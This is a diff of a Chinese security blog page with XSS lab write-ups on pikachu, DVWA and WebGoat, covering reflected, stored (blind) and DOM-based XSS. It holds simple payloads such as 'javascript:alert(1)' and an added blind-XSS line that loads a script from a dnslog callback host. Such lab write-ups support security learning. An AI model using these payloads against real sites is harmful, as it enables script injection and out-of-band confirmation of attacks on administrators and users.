@@ -195,7 +195,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      1.8k 字
+      1.9k 字
     </span>
   
 
@@ -205,7 +205,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      20
+      21
        分钟
     </span>
   
@@ -248,7 +248,7 @@
 
 <hr>
 <h3 id="反射型xss"><a href="#反射型xss" class="headerlink" title="反射型xss"></a>反射型xss</h3><p>题目来源：pikachu–xss之href输出</p>
-<p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220310201517.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/2693993651/images/master/images/20220310201517.png" srcset="/img/loading.gif" lazyload></p>
 <p>我们的输入被放在了href标签内。</p>
 <p>这种情况下除了考虑闭合&lt;a&gt;标签外，还可以利用JavaScript的通讯协议。javascript 通信协议是一个伪协议, 用于指定 URL 为 JavaScript 代码。也就是说我们可以直接在href标签内根据一下通信格式输入JavaScript代码：</p>
 <figure class="highlight isbl"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs isbl"><span class="hljs-variable">javascript</span>:<span class="hljs-function"><span class="hljs-title">alert</span>(<span class="hljs-number">1</span>)</span><br></code></pre></div></td></tr></table></figure>
@@ -261,9 +261,12 @@
 <p>默认情况下是不会编码单引号的，所以如果使用了htmlspecialchars（）来过滤的话我们只能试试用单、双引号闭合语句来构造payload。</p>
 <hr>
 <h3 id="储存型xss"><a href="#储存型xss" class="headerlink" title="储存型xss"></a>储存型xss</h3><p>题目来源：pikachu–xss之盲打</p>
-<p>我们输入的数据不会显示出来，只有管理员在后台查看时才能触发。虽然此时进行xss攻击比较困难，但一旦成功即可盗取网站管理员信息。</p>
+<p>我们输入的数据不会显示出来，只有管理员在后台查看时才能触发。那这种情况下我们怎么进行验证呢，就可以借助dnslog这个平台。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-string">&quot;&lt;script src=http://xxx.dnslog.cn&gt;&lt;/script&gt;&quot;</span><br><br></code></pre></div></td></tr></table></figure>
+
+<p><em>dnslog常用于无回显，或者一些命令执行不确定是否利用成功的渗透场景中，如sql盲注、xxe盲注，读取文，执行件命令等</em></p>
 <hr>
-<h3 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h3><h4 id="题目来源：dvwa–XSS-DOM-high级别"><a href="#题目来源：dvwa–XSS-DOM-high级别" class="headerlink" title="题目来源：dvwa–XSS (DOM),high级别"></a>题目来源：dvwa–XSS (DOM),high级别</h4><p>前端相关代码（与参数有关的JavaScript代码部分）：<img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220308133519.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h3><h4 id="题目来源：dvwa–XSS-DOM-high级别"><a href="#题目来源：dvwa–XSS-DOM-high级别" class="headerlink" title="题目来源：dvwa–XSS (DOM),high级别"></a>题目来源：dvwa–XSS (DOM),high级别</h4><p>前端相关代码（与参数有关的JavaScript代码部分）：<img src="https://raw.githubusercontent.com/2693993651/images/master/images/20220308133519.png" srcset="/img/loading.gif" lazyload></p>
 <p>源码：</p>
 <figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// Is there any input?</span><br><span class="hljs-keyword">if</span> ( array_key_exists( <span class="hljs-string">&quot;default&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; !is_null (<span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;default&#x27;</span> ]) ) &#123;<br><br>    <span class="hljs-comment"># White list the allowable languages</span><br>    <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;default&#x27;</span>]) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;French&quot;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;English&quot;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;German&quot;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;Spanish&quot;</span>:<br>            <span class="hljs-comment"># ok</span><br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            header (<span class="hljs-string">&quot;location: ?default=English&quot;</span>);<br>            <span class="hljs-keyword">exit</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></div></td></tr></table></figure>
 
@@ -276,19 +279,19 @@
 <p>可以看出DOM类型的xss漏洞有这个特点，在客户端的浏览器把接收到的HTML文件渲染成网页时，JavaScript和DOM树在这个过程交互后才形成的xss攻击，这个阶段服务器是不参与的，payload也不会进过服务器。所以针对dom类型的xss，在前端设置限制会是更有效的方式。</p>
 <hr>
 <h4 id="题目来源：WebGoat-A7lesson-10"><a href="#题目来源：WebGoat-A7lesson-10" class="headerlink" title="题目来源：WebGoat A7lesson 10"></a>题目来源：WebGoat A7lesson 10</h4><p>题目介绍：</p>
-<p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220313160037.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/2693993651/images/master/images/20220313160037.png" srcset="/img/loading.gif" lazyload></p>
 <p>这里告诉了我们DOM型xss可能在客户端中代码的<code>route configuration</code>找到。这个route我个人理解为path，和<code>configuration</code>连在一起就是规定了网页生成时会调用那些文件，怎么调用这些文件，这些文件在哪里。</p>
 <p>生产环境中的人员会为了测试网页工作的效果，会写一些测试用的js文件。而产品实际上线时，开发者又可能忘了修改这些配置信息和删除js文件。</p>
 <p>这里url中的<code>start.mvc#</code>。这个就被称为base route，这个后面接上参数就可以调用对应的js代码。此时可以看到 这里后面的参数为<code>lesson</code></p>
-<p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220313161634.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/2693993651/images/master/images/20220313161634.png" srcset="/img/loading.gif" lazyload></p>
 <p>通过这个base route（start.mvc#）接口，lesson即为一个调用的模块，其后的参数为对应的文件。</p>
 <p>我们就可以在前端源码中查找有无其它可以被调用的模块，这些模块会不会接受一些参数，使得这些参数显示在前端从而触发xss。</p>
-<p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220313162959.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/2693993651/images/master/images/20220313162959.png" srcset="/img/loading.gif" lazyload></p>
 <p>在GoatRouter.js文件中，找到了有关route的配置信息。</p>
 <p>这里就说明了start.mvc#后可以跟上五种参数：welcome、lesson/:name、lesson/:name/:pageNum</p>
 <p>、  test/:param 、reportCard，分别会调用其对应的函数。我们可以继续在源码中搜素对应函数，查看我们输入的参数去向，会不会对前端造成影响。</p>
 <p>在这里根据提示，我们也可以直接先尝试在url中调用test，模块，看看会产生什么后果。输入payload：<code>http://127.0.0.1:8080/WebGoat/start.mvc#test/123</code></p>
-<p> <img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220313164128.png" srcset="/img/loading.gif" lazyload></p>
+<p> <img src="https://raw.githubusercontent.com/2693993651/images/master/images/20220313164128.png" srcset="/img/loading.gif" lazyload></p>
 <p>原封不动的显示出了我们的参数。所以这道题的答案是<code>start.mvc#test/</code></p>
 <p>假如我们在这后面添加JavaScript代码，也就触发了xss漏洞（这也是下一关的内容）。但是需要注意的是，js代码中的<code>/</code>符号需要进行url编码，因为<code>/</code>会被当作路径的分隔符，test后面接收的参数从是<code>/</code>开始到下一个<code>/</code>结束。当然全部进行url编码也可以。</p>
 <hr>
